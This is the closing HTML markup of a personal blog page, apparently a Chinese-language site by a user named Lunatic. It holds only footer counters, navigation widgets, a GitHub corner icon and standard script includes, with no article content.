<a href=https://goodlunatic.github.io target=_blank rel="external nofollow noopener noreferrer">Lunatic</a></span></div><div class="footer-line visitor"><span id=busuanzi_container_site_uv title=总访客数><i class="fa-regular fa-user fa-fw me-1" aria-hidden=true></i><span id=busuanzi_value_site_uv><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden=true></i></span></span><span id=busuanzi_container_site_pv class=footer-divider title=总访问量><i class="fa-regular fa-eye fa-fw me-1" aria-hidden=true></i><span id=busuanzi_value_site_pv><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden=true></i></span></span></div></div></footer></div><div class=widgets><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role=button aria-label=回到顶部><i class="fa-solid fa-arrow-up fa-fw" aria-hidden=true></i><span class=variant-numeric>0%</span></div><div class="fixed-button view-comments d-none" role=button aria-label=查看评论><i class="fa-solid fa-comment fa-fw" aria-hidden=true></i></div></div><a href=https://github.com/goodlunatic title="Visit Lunatic's Github" target=_blank rel="external nofollow" class="github-corner left d-none-mobile"><svg viewBox="0 0 250 250" aria-hidden="true" width="56" height="56"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentColor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentColor" class="octo-body"/></svg></a><div id=mask></div><noscript><div class=noscript-warning>该网站在启用 JavaScript 的情况下效果最佳。</div></noscript></div><link rel=stylesheet href=/lib/pace/themes/blue/pace-theme-minimal.css><script src=/lib/autocomplete/autocomplete.min.js defer></script><script src=/lib/fuse/fuse.min.js defer></script><script src=/lib/sharer/sharer.min.js async defer></script><script src=/lib/cell-watermark/watermark.min.js defer></script><script src=https://vercount.one/js async defer></script><script src=/lib/pace/pace.min.js async defer></script><script src=/posts/5422d65/config/page.js defer></script><script src=/js/theme.min.js defer></script></body></html>